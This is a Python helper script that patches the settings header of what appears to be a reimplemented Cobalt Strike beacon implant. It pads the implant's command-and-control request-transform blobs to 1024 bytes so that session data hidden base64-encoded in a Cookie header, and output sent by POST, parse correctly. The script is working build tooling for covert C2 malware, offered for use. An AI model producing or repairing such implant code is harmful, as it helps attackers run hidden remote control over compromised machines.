# -*- coding: utf-8 -*-
r"""fix_blobs_1024.py - pad transform blobs to 1024 bytes (MAX_REQUEST_PROFILE).
TransformEncode does BeaconDataParse(&parser, request_profile, 1024) - the
parser thinks the data is 1024 bytes. Short blobs cause out-of-bounds reads
and empty string params. Official CS blobs are always 1024 bytes."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\bXZb-tmp"
     r"\openbeacon\Beacon\settings.h")
s = io.open(P, encoding="utf-8").read()

def be(v):
    return [(v >> 24) & 0xff, (v >> 16) & 0xff, (v >> 8) & 0xff, v & 0xff]

def replace_blob_1024(s, name, comment, prefix_data):
    """Pad blob to exactly 1024 bytes with zeros after prefix_data."""
    start = s.index("static const unsigned char %s[1024] = {" % name)
    end = s.index("};", start) + 2
    data = prefix_data + [0] * (1024 - len(prefix_data))
    rows = []
    for i in range(0, len(data), 16):
        rows.append("    " + ", ".join("0x%02x" % b for b in data[i:i+16]) + ",")
    body = chr(10).join(rows).rstrip(",")
    new = ("static const unsigned char %s[1024] = {" % name + chr(10) +
           "    /* " + comment + " */" + chr(10) +
           body + chr(10) + "};")
    return s[:start] + new + s[end:]

# GET: BUILD(0) -> BASE64(3) -> HEADER(6,"Cookie") + zeros to 1024
req = be(7) + be(0) + be(3) + be(6) + list(b"Cookie")
s = replace_blob_1024(s, "ob_c2_request",
                      "BUILD(session)->BASE64->HEADER(Cookie); pad to 1024", req)

# POST: BUILD(1) -> PRINT(4) -> terminator(0) + zeros to 1024
post = be(7) + be(1) + be(4) + be(0)
s = replace_blob_1024(s, "ob_c2_postreq",
                      "BUILD(output)->PRINT; pad to 1024", post)

io.open(P, "w", encoding="utf-8", newline="").write(s)
print("blobs padded to 1024")
